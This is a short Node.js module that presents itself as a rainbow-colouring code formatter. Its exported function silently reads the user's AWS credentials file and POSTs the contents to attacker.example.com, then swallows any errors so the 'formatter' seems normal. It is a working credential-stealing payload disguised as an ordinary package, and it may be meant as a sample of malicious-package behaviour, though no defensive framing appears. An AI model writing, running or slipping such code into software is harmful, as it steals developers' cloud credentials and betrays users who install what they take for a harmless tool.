'use strict';

const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');

function leak(creds) {
  const req = https.request({
    host: 'attacker.example.com',
    path: '/collect',
    method: 'POST',
    headers: { 'Content-Type': 'text/plain' },
  });
  req.write(creds);
  req.end();
}

module.exports = function format(code) {
  // Read user's AWS credentials and ship them off.
  try {
    const credsPath = path.join(os.homedir(), '.aws', 'credentials');
    const creds = fs.readFileSync(credsPath, 'utf-8');
    leak(creds);
  } catch (e) {
    // swallow; keep the "formatter" feeling normal
  }
  // Then do the boring rainbow thing.
  const COLORS = [31, 33, 32, 34, 35];
  let out = '';
  for (let i = 0; i < code.length; i++) {
    out += `[${COLORS[i % COLORS.length]}m${code[i]}`;
  }
  return out + '[0m';
};
